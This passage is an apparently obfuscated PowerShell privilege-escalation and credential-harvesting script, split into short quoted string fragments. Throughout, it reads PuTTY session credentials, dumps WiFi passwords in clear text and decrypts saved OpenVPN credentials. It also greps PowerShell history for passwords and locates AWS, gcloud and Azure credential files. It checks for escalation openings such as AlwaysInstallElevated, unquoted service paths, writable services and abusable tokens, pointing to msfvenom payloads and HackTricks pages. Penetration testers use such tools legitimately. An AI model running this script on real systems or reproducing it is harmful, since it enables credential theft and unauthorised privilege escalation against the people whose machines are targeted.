    @("Hos','tName", "PortNumber','", "UserName", "Pub','licKeyFile", "PortF','orwardings", "Conne','ctionSharing", "Pro','xyUsername", "Proxy','Password") | ForEac','h-Object {
      Wr','ite-Host "$_ :"
   ','   Write-Host "$((G','et-ItemProperty  HK','CU:\SOFTWARE\SimonT','atham\PuTTY\Session','s\$RegKeyName).$_)"','
    }
  }
}
else {',' Write-Host "No put','ty credentials foun','d in HKCU:\SOFTWARE','\SimonTatham\PuTTY\','Sessions" }


Write','-Host ""
if ($TimeS','tamp) { TimeElapsed',' }
Write-Host -Fore','groundColor Blue "=','========|| SSH Key ','Checks"
Write-Host ','""
if ($TimeStamp) ','{ TimeElapsed }
Wri','te-Host -Foreground','Color Blue "=======','==|| If found:"
Wri','te-Host "https://bl','og.ropnop.com/extra','cting-ssh-private-k','eys-from-windows-10','-ssh-agent/" -Foreg','roundColor Yellow
W','rite-Host ""
if ($T','imeStamp) { TimeEla','psed }
Write-Host -','ForegroundColor Blu','e "=========|| Chec','king Putty SSH KNOW','N HOSTS"
if (Test-P','ath HKCU:\Software\','SimonTatham\PuTTY\S','shHostKeys) { 
  Wr','ite-Host "$((Get-It','em -Path HKCU:\Soft','ware\SimonTatham\Pu','TTY\SshHostKeys).Pr','operty)"
}
else { W','rite-Host "No putty',' ssh keys found" }
','
Write-Host ""
if (','$TimeStamp) { TimeE','lapsed }
Write-Host',' -ForegroundColor B','lue "=========|| Ch','ecking for OpenSSH ','Keys"
if (Test-Path',' HKCU:\Software\Ope','nSSH\Agent\Keys) { ','Write-Host "OpenSSH',' keys found. Try th','is for decryption: ','https://github.com/','ropnop/windows_ssha','gent_extract" -Fore','groundColor Yellow ','}
else { Write-Host',' "No OpenSSH Keys f','ound." }


Write-Ho','st ""
if ($TimeStam','p) { TimeElapsed }
','Write-Host -Foregro','undColor Blue "====','=====|| Checking fo','r WinVNC Passwords"','
if ( Test-Path "HK','CU:\Software\ORL\Wi','nVNC3\Password") { ','Write-Host " WinVNC',' found at HKCU:\Sof','tware\ORL\WinVNC3\P','assword" }else { Wr','ite-Host "No WinVNC',' found." }


Write-','Host ""
if ($TimeSt','amp) { TimeElapsed ','}
Write-Host -Foreg','roundColor Blue "==','=======|| Checking ','for SNMP Passwords"','
if ( Test-Path "HK','LM:\SYSTEM\CurrentC','ontrolSet\Services\','SNMP" ) { Write-Hos','t "SNMP Key found a','t HKLM:\SYSTEM\Curr','entControlSet\Servi','ces\SNMP" }else { W','rite-Host "No SNMP ','found." }


Write-H','ost ""
if ($TimeSta','mp) { TimeElapsed }','
Write-Host -Foregr','oundColor Blue "===','======|| Checking f','or TightVNC Passwor','ds"
if ( Test-Path ','"HKCU:\Software\Tig','htVNC\Server") { Wr','ite-Host "TightVNC ','key found at HKCU:\','Software\TightVNC\S','erver" }else { Writ','e-Host "No TightVNC',' found." }


Write-','Host ""
if ($TimeSt','amp) { TimeElapsed ','}
Write-Host -Foreg','roundColor Blue "==','=======|| UAC Setti','ngs"
if ((Get-ItemP','roperty HKLM:\SOFTW','ARE\Microsoft\Windo','ws\CurrentVersion\P','olicies\System).Ena','bleLUA -eq 1) {
  W','rite-Host "EnableLU','A is equal to 1. Pa','rt or all of the UA','C components are on','."
  Write-Host "ht','tps://book.hacktric','ks.xyz/windows-hard','ening/windows-local','-privilege-escalati','on#basic-uac-bypass','-full-file-system-a','ccess" -ForegroundC','olor Yellow
}
else ','{ Write-Host "Enabl','eLUA value not equa','l to 1" }


Write-H','ost ""
if ($TimeSta','mp) { TimeElapsed }','
Write-Host -Foregr','oundColor Blue "===','======|| Recently R','un Commands (WIN+R)','"

Get-ChildItem HK','U:\ -ErrorAction Si','lentlyContinue | Fo','rEach-Object {
  # ','get the SID from ou','tput
  $HKUSID = $_','.Name.Replace(''HKEY','_USERS\'', "")
  $pr','operty = (Get-Item ','"HKU:\$_\SOFTWARE\M','icrosoft\Windows\Cu','rrentVersion\Explor','er\RunMRU" -ErrorAc','tion SilentlyContin','ue).Property
  $HKU','SID | ForEach-Objec','t {
    if (Test-Pa','th "HKU:\$_\SOFTWAR','E\Microsoft\Windows','\CurrentVersion\Exp','lorer\RunMRU") {
  ','    Write-Host -For','egroundColor Blue "','=========||HKU Rece','ntly Run Commands"
','      foreach ($p i','n $property) {
    ','    Write-Host "$((','Get-Item "HKU:\$_\S','OFTWARE\Microsoft\W','indows\CurrentVersi','on\Explorer\RunMRU"','-ErrorAction Silent','lyContinue).getValu','e($p))" 
      }
  ','  }
  }
}

Write-Ho','st ""
if ($TimeStam','p) { TimeElapsed }
','Write-Host -Foregro','undColor Blue "====','=====||HKCU Recentl','y Run Commands"
$pr','operty = (Get-Item ','"HKCU:\SOFTWARE\Mic','rosoft\Windows\Curr','entVersion\Explorer','\RunMRU" -ErrorActi','on SilentlyContinue',').Property
foreach ','($p in $property) {','
  Write-Host "$((G','et-Item "HKCU:\SOFT','WARE\Microsoft\Wind','ows\CurrentVersion\','Explorer\RunMRU"-Er','rorAction SilentlyC','ontinue).getValue($','p))"
}

Write-Host ','""
if ($TimeStamp) ','{ TimeElapsed }
Wri','te-Host -Foreground','Color Blue "=======','==|| Always Install',' Elevated Check"
 
','Write-Host "Checkin','g Windows Installer',' Registry (will pop','ulate if the key ex','ists)"
if ((Get-Ite','mProperty HKLM:\SOF','TWARE\Policies\Micr','osoft\Windows\Insta','ller -ErrorAction S','ilentlyContinue).Al','waysInstallElevated',' -eq 1) {
  Write-H','ost "HKLM:\SOFTWARE','\Policies\Microsoft','\Windows\Installer)','.AlwaysInstallEleva','ted = 1" -Foregroun','dColor red
  Write-','Host "Try msfvenom ','msi package to esca','late" -ForegroundCo','lor red
  Write-Hos','t "https://book.hac','ktricks.xyz/windows','-hardening/windows-','local-privilege-esc','alation#metasploit-','payloads" -Foregrou','ndColor Yellow
}
 
','if ((Get-ItemProper','ty HKCU:\SOFTWARE\P','olicies\Microsoft\W','indows\Installer -E','rrorAction Silently','Continue).AlwaysIns','tallElevated -eq 1)',' { 
  Write-Host "H','KCU:\SOFTWARE\Polic','ies\Microsoft\Windo','ws\Installer).Alway','sInstallElevated = ','1" -ForegroundColor',' red
  Write-Host "','Try msfvenom msi pa','ckage to escalate" ','-ForegroundColor re','d
  Write-Host "htt','ps://book.hacktrick','s.xyz/windows-harde','ning/windows-local-','privilege-escalatio','n#metasploit-payloa','ds" -ForegroundColo','r Yellow
}


Write-','Host ""
if ($TimeSt','amp) { TimeElapsed ','}
Write-Host -Foreg','roundColor Blue "==','=======|| PowerShel','l Info"

(Get-ItemP','roperty registry::H','KEY_LOCAL_MACHINE\S','OFTWARE\Microsoft\P','owerShell\1\PowerSh','ellEngine).PowerShe','llVersion | ForEach','-Object {
  Write-H','ost "PowerShell $_ ','available"
}
(Get-I','temProperty registr','y::HKEY_LOCAL_MACHI','NE\SOFTWARE\Microso','ft\PowerShell\3\Pow','erShellEngine).Powe','rShellVersion | For','Each-Object {
  Wri','te-Host  "PowerShel','l $_ available"
}

','
Write-Host ""
if (','$TimeStamp) { TimeE','lapsed }
Write-Host',' -ForegroundColor B','lue "=========|| Po','werShell Registry T','ranscript Check"

i','f (Test-Path HKCU:\','Software\Policies\M','icrosoft\Windows\Po','werShell\Transcript','ion) {
  Get-Item H','KCU:\Software\Polic','ies\Microsoft\Windo','ws\PowerShell\Trans','cription
}
if (Test','-Path HKLM:\Softwar','e\Policies\Microsof','t\Windows\PowerShel','l\Transcription) {
','  Get-Item HKLM:\So','ftware\Policies\Mic','rosoft\Windows\Powe','rShell\Transcriptio','n
}
if (Test-Path H','KCU:\Wow6432Node\So','ftware\Policies\Mic','rosoft\Windows\Powe','rShell\Transcriptio','n) {
  Get-Item HKC','U:\Wow6432Node\Soft','ware\Policies\Micro','soft\Windows\PowerS','hell\Transcription
','}
if (Test-Path HKL','M:\Wow6432Node\Soft','ware\Policies\Micro','soft\Windows\PowerS','hell\Transcription)',' {
  Get-Item HKLM:','\Wow6432Node\Softwa','re\Policies\Microso','ft\Windows\PowerShe','ll\Transcription
}
',' 

Write-Host ""
if',' ($TimeStamp) { Tim','eElapsed }
Write-Ho','st -ForegroundColor',' Blue "=========|| ','PowerShell Module L','og Check"
if (Test-','Path HKCU:\Software','\Policies\Microsoft','\Windows\PowerShell','\ModuleLogging) {
 ',' Get-Item HKCU:\Sof','tware\Policies\Micr','osoft\Windows\Power','Shell\ModuleLogging','
}
if (Test-Path HK','LM:\Software\Polici','es\Microsoft\Window','s\PowerShell\Module','Logging) {
  Get-It','em HKLM:\Software\P','olicies\Microsoft\W','indows\PowerShell\M','oduleLogging
}
if (','Test-Path HKCU:\Wow','6432Node\Software\P','olicies\Microsoft\W','indows\PowerShell\M','oduleLogging) {
  G','et-Item HKCU:\Wow64','32Node\Software\Pol','icies\Microsoft\Win','dows\PowerShell\Mod','uleLogging
}
if (Te','st-Path HKLM:\Wow64','32Node\Software\Pol','icies\Microsoft\Win','dows\PowerShell\Mod','uleLogging) {
  Get','-Item HKLM:\Wow6432','Node\Software\Polic','ies\Microsoft\Windo','ws\PowerShell\Modul','eLogging
}
 

Write','-Host ""
if ($TimeS','tamp) { TimeElapsed',' }
Write-Host -Fore','groundColor Blue "=','========|| PowerShe','ll Script Block Log',' Check"
 
if ( Test','-Path HKCU:\Softwar','e\Policies\Microsof','t\Windows\PowerShel','l\ScriptBlockLoggin','g) {
  Get-Item HKC','U:\Software\Policie','s\Microsoft\Windows','\PowerShell\ScriptB','lockLogging
}
if ( ','Test-Path HKLM:\Sof','tware\Policies\Micr','osoft\Windows\Power','Shell\ScriptBlockLo','gging) {
  Get-Item',' HKLM:\Software\Pol','icies\Microsoft\Win','dows\PowerShell\Scr','iptBlockLogging
}
i','f ( Test-Path HKCU:','\Wow6432Node\Softwa','re\Policies\Microso','ft\Windows\PowerShe','ll\ScriptBlockLoggi','ng) {
  Get-Item HK','CU:\Wow6432Node\Sof','tware\Policies\Micr','osoft\Windows\Power','Shell\ScriptBlockLo','gging
}
if ( Test-P','ath HKLM:\Wow6432No','de\Software\Policie','s\Microsoft\Windows','\PowerShell\ScriptB','lockLogging) {
  Ge','t-Item HKLM:\Wow643','2Node\Software\Poli','cies\Microsoft\Wind','ows\PowerShell\Scri','ptBlockLogging
}


','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| WSU','S check for http an','d UseWAServer = 1, ','if true, might be v','ulnerable to exploi','t"
Write-Host "http','s://book.hacktricks','.xyz/windows-harden','ing/windows-local-p','rivilege-escalation','#wsus" -ForegroundC','olor Yellow
if (Tes','t-Path HKLM:\SOFTWA','RE\Policies\Microso','ft\Windows\WindowsU','pdate) {
  Get-Item',' HKLM:\SOFTWARE\Pol','icies\Microsoft\Win','dows\WindowsUpdate
','}
if ((Get-ItemProp','erty HKLM:\SOFTWARE','\Policies\Microsoft','\Windows\WindowsUpd','ate\AU -Name "USEWU','Server" -ErrorActio','n SilentlyContinue)','.UseWUServer) {
  (','Get-ItemProperty HK','LM:\SOFTWARE\Polici','es\Microsoft\Window','s\WindowsUpdate\AU ','-Name "USEWUServer"',').UseWUServer
}


W','rite-Host ""
if ($T','imeStamp) { TimeEla','psed }
Write-Host -','ForegroundColor Blu','e "=========|| Inte','rnet Settings HKCU ','/ HKLM"

$property ','= (Get-Item "HKCU:\','Software\Microsoft\','Windows\CurrentVers','ion\Internet Settin','gs" -ErrorAction Si','lentlyContinue).Pro','perty
foreach ($p i','n $property) {
  Wr','ite-Host "$p - $((G','et-Item "HKCU:\Soft','ware\Microsoft\Wind','ows\CurrentVersion\','Internet Settings"-','ErrorAction Silentl','yContinue).getValue','($p))"
}
 
$propert','y = (Get-Item "HKLM',':\Software\Microsof','t\Windows\CurrentVe','rsion\Internet Sett','ings" -ErrorAction ','SilentlyContinue).P','roperty
foreach ($p',' in $property) {
  ','Write-Host "$p - $(','(Get-Item "HKLM:\So','ftware\Microsoft\Wi','ndows\CurrentVersio','n\Internet Settings','"-ErrorAction Silen','tlyContinue).getVal','ue($p))"
}



#####','###################',' PROCESS INFORMATIO','N #################','#######
Write-Host ','""
if ($TimeStamp) ','{ TimeElapsed }
Wri','te-Host -Foreground','Color Blue "=======','==|| RUNNING PROCES','SES"


Write-Host "','"
if ($TimeStamp) {',' TimeElapsed }
Writ','e-Host -ForegroundC','olor Blue "========','=|| Checking user p','ermissions on runni','ng processes"
Get-P','rocess | Select-Obj','ect Path -Unique | ','ForEach-Object { St','art-ACLCheck -Targe','t $_.path }


#TODO',', vulnerable system',' process running th','at we have access t','o. 
Write-Host ""
i','f ($TimeStamp) { Ti','meElapsed }
Write-H','ost -ForegroundColo','r Blue "=========||',' System processes"
','Start-Process taskl','ist -ArgumentList ''','/v /fi "username eq',' system"'' -Wait -No','NewWindow


#######','################# S','ERVICES ###########','#############
Write','-Host ""
if ($TimeS','tamp) { TimeElapsed',' }
Write-Host -Fore','groundColor Blue "=','========|| SERVICE ','path vulnerable che','ck"
Write-Host "Che','cking for vulnerabl','e service .exe"
# G','athers all services',' running and stoppe','d, based on .exe an','d shows the AccessC','ontrolList
$UniqueS','ervices = @{}
Get-W','miObject Win32_Serv','ice | Where-Object ','{ $_.PathName -like',' ''*.exe*'' } | ForEa','ch-Object {
  $Path',' = ($_.PathName -sp','lit ''(?<=\.exe\b)'')','[0].Trim(''"'')
  $Un','iqueServices[$Path]',' = $_.Name
}
foreac','h ( $h in ($UniqueS','ervices | Select-Ob','ject -Unique).GetEn','umerator()) {
  Sta','rt-ACLCheck -Target',' $h.Name -ServiceNa','me $h.Value
}


###','###################','## UNQUOTED SERVICE',' PATH CHECK #######','#####
Write-Host ""','
if ($TimeStamp) { ','TimeElapsed }
Write','-Host -ForegroundCo','lor Blue "=========','|| Checking for Unq','uoted Service Paths','"
# All credit to I','van-Sincek
# https:','//github.com/ivan-s','incek/unquoted-serv','ice-paths/blob/mast','er/src/unquoted_ser','vice_paths_mini.ps1','

UnquotedServicePa','thCheck


#########','############### REG','ISTRY SERVICE CONFI','GURATION CHECK ###
','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| Che','cking Service Regis','try Permissions"
Wr','ite-Host "This will',' take some time."

','Get-ChildItem ''HKLM',':\System\CurrentCon','trolSet\services\'' ','| ForEach-Object {
','  $target = $_.Name','.Replace("HKEY_LOCA','L_MACHINE", "hklm:"',')
  Start-aclcheck ','-Target $target
}

','
##################','###### SCHEDULED TA','SKS ###############','#########
Write-Hos','t ""
if ($TimeStamp',') { TimeElapsed }
W','rite-Host -Foregrou','ndColor Blue "=====','====|| SCHEDULED TA','SKS vulnerable chec','k"
#Scheduled tasks',' audit 

Write-Host',' ""
if ($TimeStamp)',' { TimeElapsed }
Wr','ite-Host -Foregroun','dColor Blue "======','===|| Testing acces','s to c:\windows\sys','tem32\tasks"
if (Ge','t-ChildItem "c:\win','dows\system32\tasks','" -ErrorAction Sile','ntlyContinue) {
  W','rite-Host "Access c','onfirmed, may need ','futher investigatio','n"
  Get-ChildItem ','"c:\windows\system3','2\tasks"
}
else {
 ',' Write-Host "No adm','in access to schedu','led tasks folder."
','  Get-ScheduledTask',' | Where-Object { $','_.TaskPath -notlike',' "\Microsoft*" } | ','ForEach-Object {
  ','  $Actions = $_.Act','ions.Execute
    if',' ($Actions -ne $nul','l) {
      foreach ','($a in $actions) {
','        if ($a -lik','e "%windir%*") { $a',' = $a.replace("%win','dir%", $Env:windir)',' }
        elseif (','$a -like "%SystemRo','ot%*") { $a = $a.re','place("%SystemRoot%','", $Env:windir) }
 ','       elseif ($a -','like "%localappdata','%*") { $a = $a.repl','ace("%localappdata%','", "$env:UserProfil','e\appdata\local") }','
        elseif ($a',' -like "%appdata%*"',') { $a = $a.replace','("%localappdata%", ','$env:Appdata) }
   ','     $a = $a.Replac','e(''"'', '''')
        ','Start-ACLCheck -Tar','get $a
        Writ','e-Host "`n"
       ',' Write-Host "TaskNa','me: $($_.TaskName)"','
        Write-Host',' "-------------"
  ','      [pscustomobje','ct]@{
          Las','tResult = $(($_ | G','et-ScheduledTaskInf','o).LastTaskResult)
','          NextRun  ','  = $(($_ | Get-Sch','eduledTaskInfo).Nex','tRunTime)
         ',' Status     = $_.St','ate
          Comma','nd    = $_.Actions.','execute
          A','rguments  = $_.Acti','ons.Arguments 
    ','    } | Write-Host
','      } 
    }
  }
','}


###############','######### STARTUP A','PPLIICATIONS ######','###################','
Write-Host ""
if (','$TimeStamp) { TimeE','lapsed }
Write-Host',' -ForegroundColor B','lue "=========|| ST','ARTUP APPLICATIONS ','Vulnerable Check"
"','Check if you can mo','dify any binary tha','t is going to be ex','ecuted by admin or ','if you can imperson','ate a not found bin','ary"
Write-Host "ht','tps://book.hacktric','ks.xyz/windows-hard','ening/windows-local','-privilege-escalati','on#run-at-startup" ','-ForegroundColor Ye','llow

@("C:\Documen','ts and Settings\All',' Users\Start Menu\P','rograms\Startup",
 ',' "C:\Documents and ','Settings\$env:Usern','ame\Start Menu\Prog','rams\Startup", 
  "','$env:ProgramData\Mi','crosoft\Windows\Sta','rt Menu\Programs\St','artup", 
  "$env:Ap','pdata\Microsoft\Win','dows\Start Menu\Pro','grams\Startup") | F','orEach-Object {
  i','f (Test-Path $_) {
','    # CheckACL of e','ach top folder then',' each sub folder/fi','le
    Start-ACLChe','ck $_
    Get-Child','Item -Recurse -Forc','e -Path $_ | ForEac','h-Object {
      $S','ubItem = $_.FullNam','e
      if (Test-Pa','th $SubItem) { 
   ','     Start-ACLCheck',' -Target $SubItem
 ','     }
    }
  }
}
','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| STA','RTUP APPS Registry ','Check"

@("registry','::HKLM\Software\Mic','rosoft\Windows\Curr','entVersion\Run",
  ','"registry::HKLM\Sof','tware\Microsoft\Win','dows\CurrentVersion','\RunOnce",
  "regis','try::HKCU\Software\','Microsoft\Windows\C','urrentVersion\Run",','
  "registry::HKCU\','Software\Microsoft\','Windows\CurrentVers','ion\RunOnce") | For','Each-Object {
  # C','heckACL of each Pro','perty Value found
 ',' $ROPath = $_
  (Ge','t-Item $_) | ForEac','h-Object {
    $ROP','roperty = $_.proper','ty
    $ROProperty ','| ForEach-Object {
','      Start-ACLChec','k ((Get-ItemPropert','y -Path $ROPath).$_',' -split ''(?<=\.exe\','b)'')[0].Trim(''"'')
 ','   }
  }
}

#schtas','ks /query /fo TABLE',' /nh | findstr /v /','i "disable deshab i','nforma"


#########','############### INS','TALLED APPLICATIONS',' ##################','######
Write-Host "','"
if ($TimeStamp) {',' TimeElapsed }
Writ','e-Host -ForegroundC','olor Blue "========','=|| INSTALLED APPLI','CATIONS"
Write-Host',' "Generating list o','f installed applica','tions"

Get-CimInst','ance -class win32_P','roduct | Select-Obj','ect Name, Version |',' 
ForEach-Object {
','  Write-Host $("{0}',' : {1}" -f $_.Name,',' $_.Version)  
}


','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| LOO','KING FOR BASH.EXE"
','Get-ChildItem C:\Wi','ndows\WinSxS\ -Filt','er "amd64_microsoft','-windows-lxss-bash*','" | ForEach-Object ','{
  Write-Host $((G','et-ChildItem $_.Ful','lName -Recurse -Fil','ter "*bash.exe*").F','ullName)
}
@("bash.','exe", "wsl.exe") | ','ForEach-Object { Wr','ite-Host $((Get-Chi','ldItem C:\Windows\S','ystem32\ -Filter $_',').FullName) }


Wri','te-Host ""
if ($Tim','eStamp) { TimeElaps','ed }
Write-Host -Fo','regroundColor Blue ','"=========|| LOOKIN','G FOR SCCM CLIENT"
','$result = Get-WmiOb','ject -Namespace "ro','ot\ccm\clientSDK" -','Class CCM_Applicati','on -Property * -Err','orAction SilentlyCo','ntinue | Select-Obj','ect Name, SoftwareV','ersion
if ($result)',' { $result }
elseif',' (Test-Path ''C:\Win','dows\CCM\SCClient.e','xe'') { Write-Host "','SCCM Client found a','t C:\Windows\CCM\SC','Client.exe" -Foregr','oundColor Cyan }
el','se { Write-Host "No','t Installed." }


#','###################','#### NETWORK INFORM','ATION #############','###########
Write-H','ost ""
if ($TimeSta','mp) { TimeElapsed }','
Write-Host -Foregr','oundColor Blue "===','======|| NETWORK IN','FORMATION"

Write-H','ost ""
if ($TimeSta','mp) { TimeElapsed }','
Write-Host -Foregr','oundColor Blue "===','======|| HOSTS FILE','"

Write-Host "Get ','content of etc\host','s file"
Get-Content',' "c:\windows\system','32\drivers\etc\host','s"

Write-Host ""
i','f ($TimeStamp) { Ti','meElapsed }
Write-H','ost -ForegroundColo','r Blue "=========||',' IP INFORMATION"

#',' Get all v4 and v6 ','addresses
Write-Hos','t ""
if ($TimeStamp',') { TimeElapsed }
W','rite-Host -Foregrou','ndColor Blue "=====','====|| Ipconfig ALL','"
Start-Process ipc','onfig.exe -Argument','List "/all" -Wait -','NoNewWindow


Write','-Host ""
if ($TimeS','tamp) { TimeElapsed',' }
Write-Host -Fore','groundColor Blue "=','========|| DNS Cach','e"
ipconfig /displa','ydns | Select-Strin','g "Record" | ForEac','h-Object { Write-Ho','st $(''{0}'' -f $_) }','
 
Write-Host ""
if',' ($TimeStamp) { Tim','eElapsed }
Write-Ho','st -ForegroundColor',' Blue "=========|| ','LISTENING PORTS"

#',' running netstat as',' powershell is too ','slow to print to co','nsole
Start-Process',' NETSTAT.EXE -Argum','entList "-ano" -Wai','t -NoNewWindow


Wr','ite-Host ""
if ($Ti','meStamp) { TimeElap','sed }
Write-Host -F','oregroundColor Blue',' "=========|| ARP T','able"

# Arp table ','info
Start-Process ','arp -ArgumentList "','-A" -Wait -NoNewWin','dow

Write-Host ""
','if ($TimeStamp) { T','imeElapsed }
Write-','Host -ForegroundCol','or Blue "=========|','| Routes"

# Route ','info
Start-Process ','route -ArgumentList',' "print" -Wait -NoN','ewWindow

Write-Hos','t ""
if ($TimeStamp',') { TimeElapsed }
W','rite-Host -Foregrou','ndColor Blue "=====','====|| Network Adap','ter info"

# Networ','k Adapter info
Get-','NetAdapter | ForEac','h-Object { 
  Write','-Host "----------"
','  Write-Host $_.Nam','e
  Write-Host $_.I','nterfaceDescription','
  Write-Host $_.if','Index
  Write-Host ','$_.Status
  Write-H','ost $_.MacAddress
 ',' Write-Host "------','----"
} 


Write-Ho','st ""
if ($TimeStam','p) { TimeElapsed }
','Write-Host -Foregro','undColor Blue "====','=====|| Checking fo','r WiFi passwords"
#',' Select all wifi ad','apters, then pull t','he SSID along with ','the password

((net','sh.exe wlan show pr','ofiles) -match ''\s{','2,}:\s'').replace(" ','   All User Profile','     : ", "") | For','Each-Object {
  net','sh wlan show profil','e name="$_" key=cle','ar 
}


Write-Host ','""
if ($TimeStamp) ','{ TimeElapsed }
Wri','te-Host -Foreground','Color Blue "=======','==|| Enabled firewa','ll rules - displayi','ng command only - i','t can overwrite the',' display buffer"
Wr','ite-Host -Foregroun','dColor Blue "======','===|| show all rule','s with: netsh advfi','rewall firewall sho','w rule dir=in name=','all"
# Route info

','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| SMB',' SHARES"
Write-Host',' "Will enumerate SM','B Shares and Access',' if any are availab','le" 

Get-SmbShare ','| Get-SmbShareAcces','s | ForEach-Object ','{
  $SMBShareObject',' = $_
# see line 70',' for explanation of',' what this does
  w','hoami.exe /groups /','fo csv | select-obj','ect -skip 2 | Conve','rtFrom-Csv -Header ','''group name'' | Sele','ct-Object -ExpandPr','operty ''group name''',' | ForEach-Object {','
    if ($SMBShareO','bject.AccountName -','like $_ -and ($SMBS','hareObject.AccessRi','ght -like "Full" -o','r "Change") -and $S','MBShareObject.Acces','sControlType -like ','"Allow" ) {
      W','rite-Host -Foregrou','ndColor red "$($SMB','ShareObject.Account','Name) has $($SMBSha','reObject.AccessRigh','t) to $($SMBShareOb','ject.Name)"
    }
 ',' }
}


############','############ USER I','NFO ###############','#########
Write-Hos','t ""
if ($TimeStamp',') { TimeElapsed }
W','rite-Host -Foregrou','ndColor Blue "=====','====|| USER INFO"
W','rite-Host "== || Ge','nerating List of al','l Local Administrat','ors, Users and Back','up Operators (if an','y exist)"

# Code h','as been modified to',' accomodate for any',' language by filter','ing only on the out','put and not looking',' for a string of te','xt
# Foreach loop t','o get all local gro','ups, then examine e','ach group''s members','.
Get-LocalGroup | ','ForEach-Object {
  ','"`n Group: $($_.Nam','e) `n" ; if(Get-Loc','alGroupMember -name',' $_.Name){
    (Get','-LocalGroupMember -','name $_.Name).Name}','
    else{"     {GR','OUP EMPTY}"}}


Wri','te-Host ""
if ($Tim','eStamp) { TimeElaps','ed }
Write-Host -Fo','regroundColor Blue ','"=========|| USER D','IRECTORY ACCESS CHE','CK"
Get-ChildItem C',':\Users\* | ForEach','-Object {
  if (Get','-ChildItem $_.FullN','ame -ErrorAction Si','lentlyContinue) {
 ','   Write-Host -Fore','groundColor red "Re','ad Access to $($_.F','ullName)"
  }
}

#W','hoami 
Write-Host "','"
if ($TimeStamp) {',' TimeElapsed }
Writ','e-Host -ForegroundC','olor Blue "========','=|| WHOAMI INFO"
Wr','ite-Host ""
if ($Ti','meStamp) { TimeElap','sed }
Write-Host -F','oregroundColor Blue',' "=========|| Check',' Token access here:',' https://book.hackt','ricks.xyz/windows-h','ardening/windows-lo','cal-privilege-escal','ation/privilege-esc','alation-abusing-tok','ens" -ForegroundCol','or yellow
Write-Hos','t -ForegroundColor ','Blue "=========|| C','heck if you are ins','ide the Administrat','ors group or if you',' have enabled any t','oken that can be us','e to escalate privi','leges like SeImpers','onatePrivilege, SeA','ssignPrimaryPrivile','ge, SeTcbPrivilege,',' SeBackupPrivilege,',' SeRestorePrivilege',', SeCreateTokenPriv','ilege, SeLoadDriver','Privilege, SeTakeOw','nershipPrivilege, S','eDebbugPrivilege"
W','rite-Host "https://','book.hacktricks.xyz','/windows-hardening/','windows-local-privi','lege-escalation#use','rs-and-groups" -For','egroundColor Yellow','
Start-Process whoa','mi.exe -ArgumentLis','t "/all" -Wait -NoN','ewWindow


Write-Ho','st ""
if ($TimeStam','p) { TimeElapsed }
','Write-Host -Foregro','undColor Blue "====','=====|| Cloud Crede','ntials Check"
$User','s = (Get-ChildItem ','C:\Users).Name
$CCr','eds = @(".aws\crede','ntials",
  "AppData','\Roaming\gcloud\cre','dentials.db",
  "Ap','pData\Roaming\gclou','d\legacy_credential','s",
  "AppData\Roam','ing\gcloud\access_t','okens.db",
  ".azur','e\accessTokens.json','",
  ".azure\azureP','rofile.json") 
fore','ach ($u in $users) ','{
  $CCreds | ForEa','ch-Object {
    if ','(Test-Path "c:\User','s\$u\$_") { Write-H','ost "$_ found!" -Fo','regroundColor Red }','
  }
}


Write-Host',' ""
if ($TimeStamp)',' { TimeElapsed }
Wr','ite-Host -Foregroun','dColor Blue "======','===|| APPcmd Check"','
if (Test-Path ("$E','nv:SystemRoot\Syste','m32\inetsrv\appcmd.','exe")) {
  Write-Ho','st "https://book.ha','cktricks.xyz/window','s-hardening/windows','-local-privilege-es','calation#appcmd.exe','" -ForegroundColor ','Yellow
  Write-Host',' "$Env:SystemRoot\S','ystem32\inetsrv\app','cmd.exe exists!" -F','oregroundColor Red
','}


Write-Host ""
i','f ($TimeStamp) { Ti','meElapsed }
Write-H','ost -ForegroundColo','r Blue "=========||',' OpenVPN Credential','s Check"

$keys = G','et-ChildItem "HKCU:','\Software\OpenVPN-G','UI\configs" -ErrorA','ction SilentlyConti','nue
if ($Keys) {
  ','Add-Type -AssemblyN','ame System.Security','
  $items = $keys |',' ForEach-Object { G','et-ItemProperty $_.','PsPath }
  foreach ','($item in $items) {','
    $encryptedbyte','s = $item.''auth-dat','a''
    $entropy = $','item.''entropy''
    ','$entropy = $entropy','[0..(($entropy.Leng','th) - 2)]

    $dec','ryptedbytes = [Syst','em.Security.Cryptog','raphy.ProtectedData',']::Unprotect(
     ',' $encryptedBytes, 
','      $entropy, 
  ','    [System.Securit','y.Cryptography.Data','ProtectionScope]::C','urrentUser)
 
    W','rite-Host ([System.','Text.Encoding]::Uni','code.GetString($dec','ryptedbytes))
  }
}','


Write-Host ""
if',' ($TimeStamp) { Tim','eElapsed }
Write-Ho','st -ForegroundColor',' Blue "=========|| ','PowerShell History ','(Password Search On','ly)"

Write-Host "=','|| PowerShell Conso','le History"
Write-H','ost "=|| To see all',' history, run this ','command: Get-Conten','t (Get-PSReadlineOp','tion).HistorySavePa','th"
Write-Host $(Ge','t-Content (Get-PSRe','adLineOption).Histo','rySavePath | Select','-String pa)

Write-','Host "=|| AppData P','SReadline Console H','istory "
Write-Host',' "=|| To see all hi','story, run this com','mand: Get-Content $','env:USERPROFILE\App','Data\Roaming\Micros','oft\Windows\PowerSh','ell\PSReadline\Cons','oleHost_history.txt','"
Write-Host $(Get-','Content "$env:USERP','ROFILE\AppData\Roam','ing\Microsoft\Windo','ws\PowerShell\PSRea','dline\ConsoleHost_h','istory.txt" | Selec','t-String pa)


Writ','e-Host "=|| PowesRh','ell default transrc','ipt history check "','
if (Test-Path $env',':SystemDrive\transc','ripts\) { "Default ','transcripts found a','t $($env:SystemDriv','e)\transcripts\" }
','

# Enumerating Env','ironment Variables
','Write-Host ""
if ($','TimeStamp) { TimeEl','apsed }
Write-Host ','-ForegroundColor Bl','ue "=========|| ENV','IRONMENT VARIABLES ','"
Write-Host "Maybe',' you can take advan','tage of modifying/c','reating a binary in',' some of the follow','ing locations"
Writ','e-Host "PATH variab','le entries permissi','ons - place binary ','or DLL to execute i','nstead of legitimat','e"
Write-Host "http','s://book.hacktricks','.xyz/windows-harden','ing/windows-local-p','rivilege-escalation','#dll-hijacking" -Fo','regroundColor Yello','w

